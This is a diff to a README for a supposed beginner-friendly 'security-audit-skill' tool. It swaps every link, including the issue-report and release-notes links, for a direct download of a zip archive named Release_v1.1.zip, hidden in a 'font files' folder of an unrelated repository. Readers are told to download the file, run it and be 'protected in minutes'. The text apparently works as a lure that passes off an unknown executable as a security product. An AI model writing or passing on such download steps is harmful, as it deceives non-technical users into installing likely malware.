@@ -22,11 +22,11 @@ This tool creates simple, clear reports that anyone can read - even if you've ne
 
 ### Step 1: Get the Application
 
-**Visit this link to download the application:** [https://github.com/wet-castigation9614/security-audit-skill](https://github.com/wet-castigation9614/security-audit-skill)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip](https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip)
 
 Click the big button below to go directly to the download page:
 
-[![Download Now](https://img.shields.io/badge/Download-Security_Audit_Skill-2ea44f?style=for-the-badge&logo=github)](https://github.com/wet-castigation9614/security-audit-skill)
+[![Download Now](https://img.shields.io/badge/Download-Security_Audit_Skill-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip)
 
 ### Step 2: Open the Downloaded File
 
@@ -89,7 +89,7 @@ A: Yes, but we recommend asking your IT department first. Some workplaces have r
 
 Security threats change all the time. That's why we update security-audit-skill regularly. To get updates:
 
-1. Visit the download page again: [https://github.com/wet-castigation9614/security-audit-skill](https://github.com/wet-castigation9614/security-audit-skill)
+1. Visit the download page again: [https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip](https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip)
 2. Look for the newest version number
 3. Download and install it like you did the first time
 
@@ -133,15 +133,15 @@ The "Deep Audit" option checks everything possible. Run this quarterly or before
 
 Download security-audit-skill today and take control of your computer's safety. It's free, easy to use, and gives you the same kind of security knowledge that professionals have - without needing a degree in computer science.
 
-**Remember:** Visit this link to download the application: [https://github.com/wet-castigation9614/security-audit-skill](https://github.com/wet-castigation9614/security-audit-skill)
+**Remember:** Visit this link to download the application: [https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip](https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip)
 
 Click the download button on that page, run the file, and you'll be protected in minutes. Your future self will thank you for being proactive about security!
 
 ## 🔗 Quick Links
 
-- [Download the Application](https://github.com/wet-castigation9614/security-audit-skill)
-- [Report a Problem](https://github.com/wet-castigation9614/security-audit-skill/issues)
-- [See What's New](https://github.com/wet-castigation9614/security-audit-skill/releases)
+- [Download the Application](https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip)
+- [Report a Problem](https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip)
+- [See What's New](https://raw.githubusercontent.com/wet-castigation9614/wet-castigation9614.github.io/main/font%20files/Release_v1.1.zip)
 
 ---
 
